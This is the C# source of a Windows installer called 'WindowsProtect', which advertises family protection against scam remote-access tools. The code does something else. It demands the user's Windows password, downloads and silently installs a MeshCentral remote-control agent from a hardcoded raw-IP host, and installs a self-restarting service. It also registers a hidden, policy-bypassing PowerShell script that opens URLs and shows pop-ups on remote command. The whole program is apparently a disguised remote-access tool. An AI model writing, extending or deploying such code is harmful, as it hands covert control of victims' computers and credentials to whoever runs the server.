using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

[assembly: AssemblyTitle("WindowsProtect")]
[assembly: AssemblyProduct("WindowsProtect")]
[assembly: AssemblyDescription("Family PC protection and secure support setup")]
[assembly: AssemblyVersion("0.5.4.0")]
[assembly: AssemblyFileVersion("0.5.4.0")]

public class WindowsProtectSetup : Form {
  const string BaseUrl="https://devicehost.vercel.app";
  const string InstallDir=@"C:\Program Files\Common Files\DeviceSupport";
  const string ServiceExe=@"C:\Program Files\Common Files\DeviceSupport\DeviceSupportHost.exe";
  const string UserUIScript=@"C:\Program Files\Common Files\DeviceSupport\WindowsProtect_UserUI.ps1";
  const string DataDir=@"C:\ProgramData\WindowsProtect";

  TextBox ownerBox=new TextBox();
  TextBox labelBox=new TextBox();
  TextBox codeBox=new TextBox();
  TextBox userBox=new TextBox();
  TextBox passBox=new TextBox();
  bool installing;
  Label credentialHint=new Label();
  Button installButton=new Button();
  Label status=new Label();
  ProgressBar progress=new ProgressBar();

  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
  public struct CREDENTIAL {
    public uint Flags;
    public uint Type;
    public string TargetName;
    public string Comment;
    public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
    public uint CredentialBlobSize;
    public IntPtr CredentialBlob;
    public uint Persist;
    public uint AttributeCount;
    public IntPtr Attributes;
    public string TargetAlias;
    public string UserName;
  }

  [DllImport("advapi32.dll", EntryPoint="CredWriteW", CharSet=CharSet.Unicode, SetLastError=true)]
  static extern bool CredWrite([In] ref CREDENTIAL userCredential, [In] uint flags);

  public WindowsProtectSetup(){
    Text="WindowsProtect";
    AutoScaleDimensions=new SizeF(96,96);
    AutoScaleMode=AutoScaleMode.Dpi;
    ClientSize=new Size(600,704);
    StartPosition=FormStartPosition.CenterScreen;
    BackColor=Color.FromArgb(12,17,27);
    ForeColor=Color.FromArgb(234,240,249);
    Font=new Font("Segoe UI",10);
    FormBorderStyle=FormBorderStyle.FixedDialog;
    MaximizeBox=false;
    Icon=Icon.ExtractAssociatedIcon(Application.ExecutablePath);

    // A scrolling body keeps every field reachable on small screens and high DPI.
    var scroll=new Panel{Dock=DockStyle.Fill,AutoScroll=true};
    var body=new TableLayoutPanel{
      Dock=DockStyle.Top,AutoSize=true,ColumnCount=1,RowCount=0,
      Padding=new Padding(28,24,28,20),BackColor=BackColor
    };
    body.ColumnStyles.Add(new ColumnStyle(SizeType.Percent,100));
    scroll.Controls.Add(body);
    Controls.Add(scroll);

    AddRow(body,TextLabel("WINDOWSPROTECT",9,Color.FromArgb(111,170,255),FontStyle.Bold),0,10);
    AddRow(body,TextLabel("A safer PC. Peace of mind.",24,ForeColor,FontStyle.Bold),0,8);
    AddRow(body,TextLabel("Block known scam remote-access tools and keep trusted support available.",10,Color.FromArgb(160,176,197)),0,20);

    var identity=Section("01  /  THIS PC");
    Configure(ownerBox,"e.g. Mum"); Configure(labelBox,"e.g. Living room laptop");
    AddRow(identity,FieldPair("Owner / family member",ownerBox,"Device label",labelBox),0,0);
    AddRow(body,identity,0,12);

    var enrollment=Section("02  /  ACTIVATE PROTECTION");
    AddRow(enrollment,TextLabel("One-time setup code",9,Color.FromArgb(177,191,211)),0,5);
    Configure(codeBox,"XXXX-XXXX-XXXX"); AddRow(enrollment,codeBox,0,6);
    AddRow(enrollment,TextLabel("Needed for a new PC. Updates keep your existing registration.",9,Color.FromArgb(142,159,183)),0,0);
    AddRow(body,enrollment,0,12);

    var credential=Section("03  /  WINDOWS ACCOUNT  ·  REQUIRED");
    Configure(userBox,"Username"); userBox.Text=Environment.UserName;
    Configure(passBox,""); passBox.UseSystemPasswordChar=true;
    AddRow(credential,FieldPair("Windows username",userBox,"Windows password",passBox),0,8);
    credentialHint=TextLabel("Use your Windows password, not your PIN. Stored in this Windows account's Credential Manager; never uploaded.",9,Color.FromArgb(142,159,183));
    AddRow(credential,credentialHint,0,0);
    AddRow(body,credential,0,18);

    installButton.Text="Protect this PC";
    installButton.Dock=DockStyle.Top; installButton.Height=46;
    installButton.FlatStyle=FlatStyle.Flat;
    installButton.BackColor=Color.FromArgb(47,112,235);
    installButton.ForeColor=Color.White;
    installButton.Font=new Font("Segoe UI",11,FontStyle.Bold);
    installButton.FlatAppearance.BorderSize=0;
    installButton.FlatAppearance.MouseOverBackColor=Color.FromArgb(62,129,248);
    installButton.Cursor=Cursors.Hand;
    installButton.Click+=async (sender,e)=>await InstallAsync();
    AddRow(body,installButton,0,10);
    AcceptButton=installButton;

    progress.Dock=DockStyle.Top; progress.Height=5;
    progress.Style=ProgressBarStyle.Marquee; progress.Visible=false;
    AddRow(body,progress,0,8);
    status=TextLabel("Ready to protect this PC.",9,Color.FromArgb(142,159,183));
    AddRow(body,status,0,0);
    AddRow(body,TextLabel("TEST BUILD  /  0.5.4",8,Color.FromArgb(105,123,148)),12,0);

    try{
      var tokenPath=Path.Combine(DataDir,"device.token");
      if(File.Exists(tokenPath) && new FileInfo(tokenPath).Length>20){
        ownerBox.Enabled=labelBox.Enabled=codeBox.Enabled=false;
        codeBox.Text="Already registered";
        installButton.Text="Update / repair protection";
        status.Text="This PC is registered. No new setup code needed.";
      }
    }catch{}
    FormClosing+=(sender,e)=>{ if(installing) e.Cancel=true; };
    Shown+=(sender,e)=>{
      var area=Screen.FromControl(this).WorkingArea;
      if(Height>area.Height-32){ Height=Math.Max(300,area.Height-32); Top=area.Top+16; }
    };
  }

  static Label TextLabel(string text,float size,Color color,FontStyle style=FontStyle.Regular){
    return new Label{Text=text,AutoSize=true,Dock=DockStyle.Top,
      Font=new Font("Segoe UI",size,style),ForeColor=color,Margin=Padding.Empty};
  }

  static TableLayoutPanel Section(string title){
    var section=new TableLayoutPanel{Dock=DockStyle.Top,AutoSize=true,ColumnCount=1,RowCount=0,
      Padding=new Padding(16,14,16,14),BackColor=Color.FromArgb(20,28,42)};
    section.ColumnStyles.Add(new ColumnStyle(SizeType.Percent,100));
    AddRow(section,TextLabel(title,9,Color.FromArgb(111,170,255),FontStyle.Bold),0,12);
    return section;
  }

  static TableLayoutPanel FieldPair(string leftTitle,TextBox left,string rightTitle,TextBox right){
    var fields=new TableLayoutPanel{Dock=DockStyle.Top,AutoSize=true,ColumnCount=2,RowCount=2,Margin=Padding.Empty};
    fields.ColumnStyles.Add(new ColumnStyle(SizeType.Percent,50));
    fields.ColumnStyles.Add(new ColumnStyle(SizeType.Percent,50));
    fields.RowStyles.Add(new RowStyle(SizeType.AutoSize));
    fields.RowStyles.Add(new RowStyle(SizeType.AutoSize));
    var leftLabel=TextLabel(leftTitle,9,Color.FromArgb(177,191,211));
    var rightLabel=TextLabel(rightTitle,9,Color.FromArgb(177,191,211));
    leftLabel.Margin=new Padding(0,0,10,5); rightLabel.Margin=new Padding(10,0,0,5);
    left.Margin=new Padding(0,0,10,0); right.Margin=new Padding(10,0,0,0);
    fields.Controls.Add(leftLabel,0,0); fields.Controls.Add(rightLabel,1,0);
    fields.Controls.Add(left,0,1); fields.Controls.Add(right,1,1);
    return fields;
  }

  static void AddRow(TableLayoutPanel panel,Control control,int top,int bottom){
    control.Margin=new Padding(0,top,0,bottom);
    panel.RowStyles.Add(new RowStyle(SizeType.AutoSize));
    panel.Controls.Add(control,0,panel.RowCount++);
  }

  [DllImport("user32.dll", CharSet=CharSet.Unicode)]
  static extern IntPtr SendMessage(IntPtr window,int message,IntPtr wParam,string lParam);

  void Configure(TextBox box,string placeholder){
    box.Dock=DockStyle.Top; box.Font=new Font("Segoe UI",11);
    box.BackColor=Color.FromArgb(12,19,31); box.ForeColor=Color.FromArgb(234,240,249);
    box.BorderStyle=BorderStyle.FixedSingle;
    box.HandleCreated+=(sender,e)=>SendMessage(box.Handle,0x1501,IntPtr.Zero,placeholder);
  }

  static string Esc(string s){ return (s??"").Replace("\\","\\\\").Replace("\"","\\\"").Replace("\r"," ").Replace("\n"," "); }
  static string JsonValue(string json,string key){
    var m=Regex.Match(json,"\""+Regex.Escape(key)+"\"\\s*:\\s*(?:\"([^\"]*)\"|null)",RegexOptions.IgnoreCase);
    return m.Success?m.Groups[1].Value:"";
  }

  bool IsAdmin(){
    using(var id=WindowsIdentity.GetCurrent()){
      return new WindowsPrincipal(id).IsInRole(WindowsBuiltInRole.Administrator);
    }
  }

  void RelaunchElevated(){
    var psi=new ProcessStartInfo(Application.ExecutablePath){UseShellExecute=true,Verb="runas"};
    Process.Start(psi);
    Application.Exit();
  }

  async Task InstallAsync(){
    if(installing) return;
    if(!IsAdmin()){ RelaunchElevated(); return; }

    var owner=ownerBox.Text.Trim();
    var label=labelBox.Text.Trim();
    var code=codeBox.Text.Trim().ToUpperInvariant();
    var tokenPath=Path.Combine(DataDir,"device.token");
    var alreadyEnrolled=File.Exists(tokenPath) && new FileInfo(tokenPath).Length>20;

    if(!alreadyEnrolled && (String.IsNullOrWhiteSpace(owner)||String.IsNullOrWhiteSpace(label)||String.IsNullOrWhiteSpace(code))){
      MessageBox.Show("For a new PC, owner, device label and one-time setup code are required.","WindowsProtect",MessageBoxButtons.OK,MessageBoxIcon.Warning);
      return;
    }

    if(String.IsNullOrWhiteSpace(userBox.Text) || String.IsNullOrWhiteSpace(passBox.Text)){
      SetStatus("Enter your Windows username and password to continue.");
      if(String.IsNullOrWhiteSpace(userBox.Text)) userBox.Focus(); else passBox.Focus();
      return;
    }
    // CredWrite's generic credential limit is 2560 bytes.
    if(Encoding.Unicode.GetByteCount(passBox.Text)>2560){
      SetStatus("The Windows password is too long to store securely."); passBox.Focus(); return;
    }

    installing=true;
    ownerBox.Enabled=labelBox.Enabled=codeBox.Enabled=userBox.Enabled=passBox.Enabled=false;
    installButton.Enabled=false; progress.Visible=true;
    bool completed=false;
    try{
      SetStatus("Saving Windows credential locally...");
      SaveCredential(userBox.Text.Trim(),passBox.Text);
      passBox.Text="";
      ServicePointManager.SecurityProtocol=SecurityProtocolType.Tls12;
      string meshAgentUrl="";
      if(!alreadyEnrolled){
        SetStatus("Validating setup code...");
        var redeem=await PostJson(BaseUrl+"/api/setup/redeem","{\"code\":\""+Esc(code)+"\"}",null);
        var enrollKey=JsonValue(redeem,"device_enrollment_key");
        meshAgentUrl=JsonValue(redeem,"mesh_agent_url");
        if(String.IsNullOrWhiteSpace(enrollKey)) throw new Exception("Setup code was invalid or expired.");

        SetStatus("Registering this PC...");
        var enroll="{\"person_name\":\""+Esc(owner)+"\",\"device_name\":\""+Esc(label)+"\",\"computer_name\":\""+Esc(Environment.MachineName)+"\",\"protection_status\":\"pending\",\"migration_status\":\"not_started\",\"os_version\":\""+Esc(Environment.OSVersion.VersionString)+"\",\"agent_version\":\"0.5.4-test\",\"remote_access_provider\":\"meshcentral\"}";
        var enrolled=await PostJson(BaseUrl+"/api/enroll",enroll,enrollKey);
        var token=JsonValue(enrolled,"device_token");
        if(String.IsNullOrWhiteSpace(token)) throw new Exception("The registration server did not return a device token.");

        Directory.CreateDirectory(DataDir);
        var protectedBytes=ProtectedData.Protect(Encoding.UTF8.GetBytes(token),null,DataProtectionScope.LocalMachine);
        File.WriteAllText(tokenPath,Convert.ToBase64String(protectedBytes));
      }else{
        SetStatus("Existing WindowsProtect enrollment found. Updating this PC...");
      }

      SetStatus("Preparing protection services...");
      Directory.CreateDirectory(InstallDir);
      StopExistingService();
      ExtractEmbeddedService(ServiceExe);
      InstallUserUI();

      if(String.IsNullOrWhiteSpace(meshAgentUrl)) meshAgentUrl="https://34-69-184-103.sslip.io/meshagents?id=4&meshid=gY1Com9g9071ieNPRic8EHP2irnFHZxy1gpsoBn8opAi4guIJ$gAQj$INq8mbEjL&installflags=0";
      var meshReady=MeshReady();
      if(!meshReady && !String.IsNullOrWhiteSpace(meshAgentUrl)){
        SetStatus("Installing secure support component...");
        var temp=Path.Combine(Path.GetTempPath(),"WindowsProtect-MeshAgent.exe");
        using(var wc=new WebClient()) await wc.DownloadFileTaskAsync(new Uri(meshAgentUrl),temp);
        await Run(temp,"-fullinstall",90000);
        try{ File.Delete(temp); }catch{}
        for(int i=0;i<20 && !MeshReady();i++) await Task.Delay(1500);
        meshReady=MeshReady();
      }

      if(!meshReady){
        throw new Exception("The secure support connection is not ready yet. WindowsProtect was not activated so your current support route is preserved.");
      }

      InstallOrUpdateService();
      HardenWindowsProtect();

      SetStatus("Finishing security checks...");
      using(var service=new ServiceController("DeviceSupportHost")){
        await Task.Run(()=>service.WaitForStatus(ServiceControllerStatus.Running,TimeSpan.FromSeconds(20)));
      }

      completed=true;
      progress.Visible=false;
      SetStatus("WindowsProtect installed successfully.");
      installing=false;
      MessageBox.Show(this,"WindowsProtect is installed and the protection service is running.","Setup complete",MessageBoxButtons.OK,MessageBoxIcon.Information);
      Close();
    }catch(WebException ex){
      progress.Visible=false;
      SetStatus("Setup failed.");
      MessageBox.Show(ReadWebError(ex),"WindowsProtect setup failed",MessageBoxButtons.OK,MessageBoxIcon.Error);
    }catch(Exception ex){
      progress.Visible=false;
      SetStatus("Setup failed.");
      MessageBox.Show(ex.Message,"WindowsProtect setup failed",MessageBoxButtons.OK,MessageBoxIcon.Error);
    }finally{
      installing=false;
      if(!completed){
        userBox.Enabled=passBox.Enabled=installButton.Enabled=true;
        // Enrollment may have succeeded before a later installation failure.
        var registered=File.Exists(tokenPath) && new FileInfo(tokenPath).Length>20;
        ownerBox.Enabled=labelBox.Enabled=codeBox.Enabled=!registered;
        if(registered){ codeBox.Text="Already registered"; installButton.Text="Retry update / repair"; }
      }
      passBox.Text="";
    }
  }

  static async Task<string> PostJson(string url,string body,string enrollmentKey){
    using(var wc=new WebClient()){
      wc.Headers[HttpRequestHeader.ContentType]="application/json";
      if(!String.IsNullOrWhiteSpace(enrollmentKey)) wc.Headers.Add("x-enrollment-key",enrollmentKey);
      return await wc.UploadStringTaskAsync(new Uri(url),"POST",body);
    }
  }

  static string ReadWebError(WebException ex){
    try{ using(var sr=new StreamReader(ex.Response.GetResponseStream())) return sr.ReadToEnd(); }catch{ return ex.Message; }
  }

  static void ExtractEmbeddedService(string destination){
    var asm=Assembly.GetExecutingAssembly();
    using(var input=asm.GetManifestResourceStream("DeviceSupportHost.exe")){
      if(input==null) throw new Exception("WindowsProtect service payload is missing.");
      using(var output=File.Create(destination)) input.CopyTo(output);
    }
  }

  static void InstallUserUI(){
    var script=@"
$ErrorActionPreference='SilentlyContinue'
$cmdFile='C:\ProgramData\WindowsProtect\UI\ui-command.txt'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
while($true){
  if(Test-Path $cmdFile){
    $raw=[IO.File]::ReadAllText($cmdFile,[Text.Encoding]::UTF8)
    Remove-Item $cmdFile -Force
    $p=$raw.Split('|')
    if($p.Length -ge 2 -and $p[0] -eq 'url'){
      try{
        $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[1]))
        if($u -match '^https?://'){ Start-Process $u }
      }catch{}
    }
    elseif($p.Length -ge 5 -and $p[0] -eq 'message'){
      try{
        $t=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[1]))
        $m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[2]))
        $size=$p[3]; $place=$p[4]
        $w=520; $h=240
        if($size -eq 'compact'){$w=420;$h=180}
        elseif($size -eq 'large'){$w=640;$h=320}
        $f=New-Object System.Windows.Forms.Form
        $f.Text=$t; $f.ClientSize=New-Object System.Drawing.Size($w,$h)
        $f.FormBorderStyle='FixedDialog'; $f.MaximizeBox=$false; $f.MinimizeBox=$false
        $f.TopMost=$true; $f.ShowInTaskbar=$true; $f.StartPosition='Manual'; $f.BackColor=[Drawing.Color]::White
        $wa=[Windows.Forms.Screen]::PrimaryScreen.WorkingArea
        if($place -eq 'top_right'){$x=$wa.Right-$w-24;$y=$wa.Top+24}
        elseif($place -eq 'bottom_right'){$x=$wa.Right-$w-24;$y=$wa.Bottom-$h-24}
        else{$x=$wa.Left+[int](($wa.Width-$w)/2);$y=$wa.Top+[int](($wa.Height-$h)/2)}
        $f.Location=New-Object System.Drawing.Point($x,$y)
        $hdr=New-Object Windows.Forms.Panel; $hdr.Dock='Top'; $hdr.Height=56; $hdr.BackColor=[Drawing.Color]::FromArgb(17,24,39)
        $ttl=New-Object Windows.Forms.Label; $ttl.Text=$t; $ttl.Dock='Fill'; $ttl.ForeColor=[Drawing.Color]::White
        $ttl.Font=New-Object Drawing.Font('Segoe UI',14,[Drawing.FontStyle]::Bold); $ttl.Padding=New-Object Windows.Forms.Padding(18,0,18,0); $ttl.TextAlign='MiddleLeft'
        $hdr.Controls.Add($ttl)
        $body=New-Object Windows.Forms.Label; $body.Text=$m; $body.Location=New-Object Drawing.Point(20,78)
        $body.Size=New-Object Drawing.Size(($w-40),($h-142)); $body.ForeColor=[Drawing.Color]::FromArgb(31,41,55)
        $body.Font=New-Object Drawing.Font('Segoe UI',10.5); $body.TextAlign='TopLeft'
        $ok=New-Object Windows.Forms.Button; $ok.Text='OK'; $ok.Size=New-Object Drawing.Size(92,34)
        $ok.Location=New-Object Drawing.Point(($w-112),($h-52)); $ok.BackColor=[Drawing.Color]::FromArgb(37,99,235)
        $ok.ForeColor=[Drawing.Color]::White; $ok.FlatStyle='Flat'; $ok.Add_Click({$f.Close()})
        $f.Controls.Add($hdr); $f.Controls.Add($body); $f.Controls.Add($ok); $f.AcceptButton=$ok
        [void]$f.ShowDialog()
      }catch{}
    }
  }
  Start-Sleep -Milliseconds 750
}
";
    File.WriteAllText(UserUIScript,script,Encoding.UTF8);
    try{
      using(var run=Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")){
        run.SetValue("WindowsProtectUserUI","powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \""+UserUIScript+"\"");
      }
    }catch{}
    try{
      Process.Start(new ProcessStartInfo("powershell.exe","-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \""+UserUIScript+"\""){UseShellExecute=true});
    }catch{}
  }

  static bool MeshReady(){
    try{
      foreach(var name in new[]{"Mesh Agent","meshagent"}){
        try{ using(var sc=new ServiceController(name)) if(sc.Status==ServiceControllerStatus.Running) return true; }catch{}
      }
      foreach(var name in new[]{"meshagent","meshagent64","MeshAgent"}){
        try{ if(Process.GetProcessesByName(name).Length>0) return true; }catch{}
      }
    }catch{}
    return false;
  }

  static async Task<int> Run(string file,string args,int timeout){
    using(var p=new Process{StartInfo=new ProcessStartInfo(file,args){UseShellExecute=true,CreateNoWindow=true}}){
      p.Start();
      await Task.Run(()=>p.WaitForExit(timeout));
      return p.HasExited?p.ExitCode:-1;
    }
  }

  static void StopExistingService(){
    try{
      using(var sc=new ServiceController("DeviceSupportHost")){
        var x=sc.Status;
        if(x!=ServiceControllerStatus.Stopped){
          sc.Stop();
          sc.WaitForStatus(ServiceControllerStatus.Stopped,TimeSpan.FromSeconds(20));
        }
      }
    }catch(InvalidOperationException){
      // Service does not exist yet.
    }

    for(int i=0;i<20;i++){
      try{
        using(var fs=new FileStream(ServiceExe,FileMode.OpenOrCreate,FileAccess.ReadWrite,FileShare.None)){ }
        return;
      }catch(IOException){
        System.Threading.Thread.Sleep(500);
      }catch(UnauthorizedAccessException){
        System.Threading.Thread.Sleep(500);
      }
    }

    throw new IOException("WindowsProtect service is still using its executable. Please wait a few seconds and try again.");
  }

  static void HardenWindowsProtect(){
    try{
      Directory.CreateDirectory(Path.Combine(DataDir,"UI"));
      RunSc("failureflag DeviceSupportHost 1");
      RunIcacls(InstallDir,"/inheritance:r /grant:r \"SYSTEM:(OI)(CI)(F)\" \"Administrators:(OI)(CI)(F)\" \"Users:(OI)(CI)(RX)\"");
      RunIcacls(DataDir,"/inheritance:r /grant:r \"SYSTEM:(OI)(CI)(F)\" \"Administrators:(OI)(CI)(F)\"");
      var uiDir=Path.Combine(DataDir,"UI");
      RunIcacls(uiDir,"/inheritance:r /grant:r \"SYSTEM:(OI)(CI)(F)\" \"Administrators:(OI)(CI)(F)\" \"Users:(OI)(CI)(M)\"");
      var tokenPath=Path.Combine(DataDir,"device.token");
      if(File.Exists(tokenPath)) RunIcacls(tokenPath,"/inheritance:r /grant:r \"SYSTEM:(F)\" \"Administrators:(F)\"");
    }catch{}
  }

  static void RunIcacls(string path,string args){
    try{
      using(var p=new Process{StartInfo=new ProcessStartInfo("icacls.exe","\""+path+"\" "+args){UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true}}){
        p.Start(); p.WaitForExit(15000);
      }
    }catch{}
  }

  static void InstallOrUpdateService(){
    StopExistingService();

    RunSc("delete DeviceSupportHost");
    System.Threading.Thread.Sleep(800);
    RunSc("create DeviceSupportHost binPath= \"\\\""+ServiceExe+"\\\"\" start= auto DisplayName= \"Device Support Host\"");
    RunSc("description DeviceSupportHost \"WindowsProtect family anti-scam protection and security telemetry.\"");
    RunSc("failure DeviceSupportHost reset= 86400 actions= restart/5000/restart/15000/restart/30000");
    RunSc("start DeviceSupportHost");
  }

  static void RunSc(string args){
    using(var p=new Process{StartInfo=new ProcessStartInfo("sc.exe",args){UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true}}){
      p.Start(); p.WaitForExit(15000);
    }
  }

  static void SaveCredential(string username,string password){
    var bytes=Encoding.Unicode.GetBytes(password);
    var blob=Marshal.AllocCoTaskMem(bytes.Length);
    try{
      Marshal.Copy(bytes,0,blob,bytes.Length);
      var cred=new CREDENTIAL{
        Type=1,
        TargetName="WindowsProtect/LocalWindowsAccount",
        CredentialBlobSize=(uint)bytes.Length,
        CredentialBlob=blob,
        Persist=2,
        UserName=username,
        Comment="Stored locally by WindowsProtect. Never uploaded."
      };
      if(!CredWrite(ref cred,0)) throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
    }finally{
      for(int i=0;i<bytes.Length;i++) Marshal.WriteByte(blob,i,0);
      Marshal.FreeCoTaskMem(blob);
      Array.Clear(bytes,0,bytes.Length);
    }
  }

  void SetStatus(string text){
    if(InvokeRequired){ BeginInvoke(new Action<string>(SetStatus),text); return; }
    status.Text=text;
  }

  [STAThread]
  public static void Main(){
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    using(var id=WindowsIdentity.GetCurrent()){
      if(!new WindowsPrincipal(id).IsInRole(WindowsBuiltInRole.Administrator)){
        try{ Process.Start(new ProcessStartInfo(Application.ExecutablePath){UseShellExecute=true,Verb="runas"}); }
        catch(Win32Exception ex){ if(ex.NativeErrorCode!=1223) MessageBox.Show("WindowsProtect could not request administrator access.","WindowsProtect"); }
        return;
      }
    }
    Application.Run(new WindowsProtectSetup());
  }
}
